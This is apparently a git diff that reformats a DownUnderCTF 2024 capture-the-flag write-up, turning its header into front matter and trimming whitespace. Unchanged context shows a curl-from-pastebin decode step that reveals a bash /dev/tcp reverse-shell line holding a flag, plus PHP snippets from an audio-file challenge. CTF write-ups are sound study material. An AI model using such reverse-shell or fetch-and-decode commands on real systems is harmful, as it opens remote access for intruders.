@@ -1,7 +1,12 @@
-# DownUnderCTF 2024
+---
+start_at: 2024-07-05T09:30Z
+end_at: 2024-07-07T09:30Z
+ctftime: https://ctftime.org/event/2284
+links:
+- https://play.duc.tf/
+---
 
-- Official URL: [DownUnderCTF 2024](https://play.duc.tf/)
-- CTF Time: [CTFtime.org / DownUnderCTF 2024](https://ctftime.org/event/2284)
+# DownUnderCTF 2024
 
 ## Table of Contents
 
@@ -43,7 +48,7 @@ Execute the script:
 
 ```console
 $ curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d
-bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1 
+bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
 ```
 
 Flag: DUCTF{chatgpt_I_n33d_2_3scap3}
@@ -642,7 +647,7 @@ foreach(scandir('audio/') as $v) {
 ```php
 <?php
 
-define('FLAG', 'DUCTF{}'); 
+define('FLAG', 'DUCTF{}');
 ```
 
 </details>
@@ -665,7 +670,7 @@ if (!$mime || !str_starts_with($mime, 'audio')) {
 }
 
 header("Content-Type: $mime");
-readfile($file); 
+readfile($file);
 ```
 
 </details>
